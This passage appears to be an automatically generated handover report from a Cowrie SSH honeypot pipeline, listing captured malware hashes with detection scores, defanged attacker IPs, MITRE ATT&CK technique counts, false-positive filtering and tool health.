| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `103.52.153[.]215` | HK | VAPELINE TECHNOLOGY(HK).,LIMITED | **100** ⚠️ | 20 |
| `34.148.186[.]252` | US | Google LLC | **100** ⚠️ | 0 |
| `112.219.104[.]42` | KR | LG Uplus | **100** ⚠️ | 36 |
| `43.224.126[.]107` | LK | Lanka Government Cloud | **100** ⚠️ | 50 |
| `221.229.218[.]50` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
| `14.103.105[.]254` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `122.224.240[.]99` | CN | Hangzhou international Cci Capital Ltd | **100** ⚠️ | 50 |
| `187.108.193[.]54` | BR | EVEO S.A. | **100** ⚠️ | 9 |
| `194.102.73[.]93` | RO | Universitatea de Stiinte Agricole si Medicina Veterinara Cluj-Napoca | **100** ⚠️ | 0 |
| `196.188.187[.]45` | ET | Ethio Telecom | **100** ⚠️ | 20 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 23 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 10 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 9 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 5 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 5 |

---

## 🔕 False Positive Summary (34 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 13 below threshold 25 | 25 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 6 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 79 cases |
| Tool 34  | Credential Extractor        | ✅ 19 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 22 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 34 filtered (43.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 18 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 10 priority case(s) shown individually · 16 recon entry/entries in table (3 group(s) consolidating 22 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-30T23:01:55Z_
